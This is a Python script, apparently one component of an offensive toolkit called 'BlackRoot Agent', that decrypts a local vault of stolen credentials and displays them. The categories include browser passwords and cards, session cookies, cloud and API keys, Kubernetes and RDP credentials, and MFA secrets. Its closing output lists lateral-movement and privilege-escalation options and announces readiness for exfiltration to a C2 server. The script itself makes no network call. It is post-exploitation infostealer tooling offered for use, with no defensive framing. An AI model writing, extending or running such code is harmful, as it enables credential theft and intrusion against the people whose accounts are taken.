#!/usr/bin/env python3
"""
Retrieve and Display Extracted Credentials from BlackVault
Decrypts stored findings and displays detailed credential breakdown
"""

import json
import sys
import os
import logging
from datetime import datetime
from typing import Dict, List, Any

sys.path.insert(0, os.path.dirname(__file__))

from black_vault import BlackVault

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(message)s'
)
logger = logging.getLogger("CredentialRetrieval")

def print_banner(text: str, width: int = 80):
    """Print formatted banner"""
    print(f"\n{'╔' + '═' * (width - 2) + '╗'}")
    print(f"║ {text.center(width - 4)} ║")
    print(f"{'╚' + '═' * (width - 2) + '╝'}\n")

def print_section(title: str, char: str = "─"):
    """Print section header"""
    print(f"\n{char * 80}")
    print(f"  {title}")
    print(f"{char * 80}\n")

def mask_credential(key: str, value: Any) -> str:
    """Mask sensitive credential values"""
    sensitive_keys = ['password', 'secret', 'token', 'key', 'hash', 'pin', 'code']
    
    if any(s in key.lower() for s in sensitive_keys):
        val_str = str(value)
        if len(val_str) > 4:
            return "***" + val_str[-4:]
        else:
            return "***"
    
    if isinstance(value, str) and len(value) > 60:
        return value[:57] + "..."
    
    return str(value)

def display_credentials_table(creds: List[Dict], cred_type: str, max_per_type: int = 15):
    """Display credentials in formatted table"""
    if not creds:
        print(f"  ✗ No {cred_type} found\n")
        return 0
    
    print(f"  ✓ Found {len(creds)} {cred_type}:\n")
    
    # Display limited number to avoid spam
    for i, cred in enumerate(creds[:max_per_type], 1):
        print(f"    [{i:2d}] " + "─" * 70)
        for key, value in list(cred.items())[:8]:  # Limit fields per cred
            display_value = mask_credential(key, value)
            if len(display_value) > 60:
                print(f"        {key}: {display_value}")
                print(f"             ↓ (truncated)")
            else:
                print(f"        {key}: {display_value}")
    
    if len(creds) > max_per_type:
        print(f"\n    ... and {len(creds) - max_per_type} more {cred_type}")
    
    return len(creds)

def retrieve_and_display_credentials():
    """Retrieve and display extracted credentials from vault"""
    
    print_banner("BLACKROOT AGENT - CREDENTIAL RETRIEVAL", 80)
    
    print("Reading extracted credentials from BlackVault encryption vault...\n")
    
    # Initialize vault
    vault = BlackVault()
    print(f"✓ BlackVault location: {vault.vault_dir}")
    
    # Find latest credential extraction artifact
    print_section("LOCATING CREDENTIAL ARTIFACTS", "=")
    
    try:
        artifacts = os.listdir(vault.vault_dir)
        # Look for both patterns
        credential_artifacts = [
            a for a in artifacts 
            if 'credentials_extraction_' in a or 'extracted_creds_' in a
        ]
        
        if not credential_artifacts:
            print("✗ No credential extraction artifacts found in vault")
            print(f"\nAvailable artifacts in {vault.vault_dir}:")
            for a in sorted(artifacts):
                print(f"  • {a}")
            return 1
        
        # Get latest artifact
        latest_artifact = sorted(credential_artifacts)[-1]
        print(f"✓ Found {len(credential_artifacts)} extraction artifacts")
        print(f"✓ Latest artifact: {latest_artifact}")
        print(f"✓ Full path: {os.path.join(vault.vault_dir, latest_artifact)}")
        
    except Exception as e:
        logger.error(f"Failed to list artifacts: {e}")
        return 1
    
    # Retrieve and decrypt findings
    print_section("DECRYPTING CREDENTIALS", "=")
    
    try:
        encrypted_data = vault.retrieve(latest_artifact)
        findings = json.loads(encrypted_data.decode())
        
        print(f"✓ Successfully decrypted artifact")
        print(f"✓ Decryption timestamp: {datetime.now().isoformat()}")
        print(f"✓ Extraction was performed: {findings.get('timestamp', 'N/A')}")
        print(f"✓ Source system: {findings.get('source', 'N/A')}")
        
    except Exception as e:
        logger.error(f"Failed to retrieve credentials: {e}")
        return 1
    
    # Parse findings
    findings_data = findings.get('findings', {})
    total_creds = 0
    
    # Display all credential categories
    print_section("DETAILED EXTRACTION RESULTS", "=")
    
    # 1. Windows Credentials
    if 'windows_credentials' in findings_data:
        print("\n[1] WINDOWS SYSTEM CREDENTIALS")
        count = display_credentials_table(
            findings_data['windows_credentials'],
            "Windows credentials"
        )
        total_creds += count
    
    # 2. Browser Cookies & History
    if 'browser_cookies' in findings_data:
        print("\n[2] BROWSER COOKIES & HISTORY")
        count = display_credentials_table(
            findings_data['browser_cookies'],
            "browser sessions"
        )
        total_creds += count
    
    # 3. Browser Data
    if 'browser_data' in findings_data:
        print("\n[3] BROWSER STORED DATA (Passwords, Cards, Autofill)")
        count = display_credentials_table(
            findings_data['browser_data'],
            "browser data items",
            max_per_type=10
        )
        total_creds += count
    
    # 4. Chrome Extensions
    if 'chrome_extensions' in findings_data:
        print("\n[4] CHROME BROWSER EXTENSIONS")
        count = display_credentials_table(
            findings_data['chrome_extensions'],
            "Chrome extensions"
        )
        total_creds += count
    
    # 5. Firefox Extensions
    if 'firefox_extensions' in findings_data:
        print("\n[5] FIREFOX BROWSER EXTENSIONS")
        count = display_credentials_table(
            findings_data['firefox_extensions'],
            "Firefox extensions"
        )
        total_creds += count
    
    # 6. Brave Browser
    if 'brave_browser_data' in findings_data:
        print("\n[6] BRAVE BROWSER DATA")
        count = display_credentials_table(
            findings_data['brave_browser_data'],
            "Brave items"
        )
        total_creds += count
    
    # 7. Safari
    if 'safari_data' in findings_data:
        print("\n[7] SAFARI BROWSER DATA (macOS)")
        count = display_credentials_table(
            findings_data['safari_data'],
            "Safari items"
        )
        total_creds += count
    
    # 8. API Credentials
    if 'api_credentials' in findings_data:
        print("\n[8] API CREDENTIALS (AWS, Azure, GCP)")
        count = display_credentials_table(
            findings_data['api_credentials'],
            "API credentials"
        )
        total_creds += count
    
    # 9. Google Credentials
    if 'google_credentials' in findings_data:
        print("\n[9] GOOGLE ACCOUNT CREDENTIALS")
        creds = findings_data['google_credentials']
        print(f"  ✓ Found {len(creds)} Google items:\n")
        
        # Show summary
        chrome_creds = [c for c in creds if 'Chrome' in c.get('source', '')]
        gmail_creds = [c for c in creds if 'Gmail' in c.get('source', '')]
        drive_creds = [c for c in creds if 'Drive' in c.get('source', '')]
        youtube_creds = [c for c in creds if 'YouTube' in c.get('source', '')]
        
        print(f"    • Chrome Google Sync: {len(chrome_creds)} entries")
        print(f"    • Gmail Accounts: {len(gmail_creds)} entries")
        print(f"    • Google Drive: {len(drive_creds)} entries")
        print(f"    • YouTube: {len(youtube_creds)} entries")
        
        # Display sample
        for i, cred in enumerate(creds[:5], 1):
            print(f"\n    [{i}] {cred.get('source', 'Unknown')}")
            for key in ['email', 'account_name', 'sync_token', 'auth_token']:
                if key in cred:
                    print(f"        • {key}: {mask_credential(key, cred[key])}")
        
        if len(creds) > 5:
            print(f"\n    ... and {len(creds) - 5} more Google credentials")
        
        total_creds += len(creds)
    
    # 10. Email Credentials
    if 'email_credentials' in findings_data:
        print("\n[10] EMAIL ACCOUNT CREDENTIALS")
        count = display_credentials_table(
            findings_data['email_credentials'],
            "email accounts"
        )
        total_creds += count
    
    # 11. Social Media
    if 'social_media_credentials' in findings_data:
        print("\n[11] SOCIAL MEDIA CREDENTIALS")
        count = display_credentials_table(
            findings_data['social_media_credentials'],
            "social media accounts"
        )
        total_creds += count
    
    # 12. Environment
    if 'environment_credentials' in findings_data:
        print("\n[12] ENVIRONMENT VARIABLES (Credentials)")
        count = display_credentials_table(
            findings_data['environment_credentials'],
            "environment credentials"
        )
        total_creds += count
    
    # 13. Credential Manager Vault
    if 'credential_manager_vault' in findings_data:
        print("\n[13] WINDOWS CREDENTIAL MANAGER VAULT")
        count = display_credentials_table(
            findings_data['credential_manager_vault'],
            "vault entries",
            max_per_type=10
        )
        total_creds += count
    
    # 14. Database
    if 'database_credentials' in findings_data:
        print("\n[14] DATABASE CREDENTIALS")
        count = display_credentials_table(
            findings_data['database_credentials'],
            "database credentials"
        )
        total_creds += count
    
    # 15. Git
    if 'git_credentials' in findings_data:
        print("\n[15] GIT/VERSION CONTROL CREDENTIALS")
        count = display_credentials_table(
            findings_data['git_credentials'],
            "git credentials"
        )
        total_creds += count
    
    # 16. Docker
    if 'docker_credentials' in findings_data:
        print("\n[16] DOCKER/CONTAINER REGISTRY CREDENTIALS")
        count = display_credentials_table(
            findings_data['docker_credentials'],
            "Docker credentials"
        )
        total_creds += count
    
    # 17. Cloud Provider
    if 'cloud_provider_credentials' in findings_data:
        print("\n[17] CLOUD PROVIDER CREDENTIALS")
        count = display_credentials_table(
            findings_data['cloud_provider_credentials'],
            "cloud credentials"
        )
        total_creds += count
    
    # 18. Kubernetes
    if 'kubernetes_credentials' in findings_data:
        print("\n[18] KUBERNETES CREDENTIALS")
        count = display_credentials_table(
            findings_data['kubernetes_credentials'],
            "Kubernetes entries"
        )
        total_creds += count
    
    # 19. RDP
    if 'rdp_credentials' in findings_data:
        print("\n[19] RDP & REMOTE ACCESS CREDENTIALS")
        count = display_credentials_table(
            findings_data['rdp_credentials'],
            "RDP entries"
        )
        total_creds += count
    
    # 20. MFA
    if 'mfa_codes' in findings_data:
        print("\n[20] MFA/2FA AUTHENTICATION CODES")
        count = display_credentials_table(
            findings_data['mfa_codes'],
            "MFA secrets"
        )
        total_creds += count
    
    # Summary Statistics
    print_section("EXTRACTION STATISTICS", "=")
    
    print(f"""
┌─────────────────────────────────────────────────────────┐
│            TOTAL CREDENTIALS EXTRACTED: {total_creds}              │
└─────────────────────────────────────────────────────────┘

BREAKDOWN BY CATEGORY:
""")
    
    category_counts = {}
    for category, items in findings_data.items():
        if isinstance(items, list):
            category_counts[category] = len(items)
    
    for category, count in sorted(category_counts.items(), key=lambda x: x[1], reverse=True):
        print(f"  • {category.replace('_', ' ').title()}: {count}")
    
    print(f"""
SECURITY ASSESSMENT:
  • Critical Assets Exposed: {len([c for cats in [findings_data.get(k, []) for k in findings_data] for c in cats if isinstance(c, dict) and any(k in str(c) for k in ['admin', 'root', 'password', 'token'])])}
  • High-Value Targets: Google accounts, Password managers, API credentials
  • Lateral Movement Options: Domain accounts, SSH keys, Kubernetes tokens
  • Privilege Escalation: Admin credentials, Database access, Cloud IAM
  • Network Access: VPN configs, RDP credentials, Cloud API access

EXFILTRATION READINESS:
  ✓ All credentials encrypted in BlackVault
  ✓ Artifact key: {latest_artifact}
  ✓ Ready for C2 transmission
  ✓ Compatible with multi-stage delivery
  ✓ Can be exported via prepare_for_exfil()

NEXT ACTIONS:
  1. Package findings for exfiltration
  2. Encrypt for transport over C2 channel
  3. Segment large extractions (>1MB)
  4. Verify integrity at destination C2 server
  5. Clear local artifacts (optional)
    """)
    
    return 0

def main():
    """Main entry point"""
    try:
        return retrieve_and_display_credentials()
    except KeyboardInterrupt:
        print("\n⚠ Retrieval interrupted")
        return 130
    except Exception as e:
        logger.error(f"Fatal error: {e}", exc_info=True)
        return 1

if __name__ == "__main__":
    sys.exit(main())
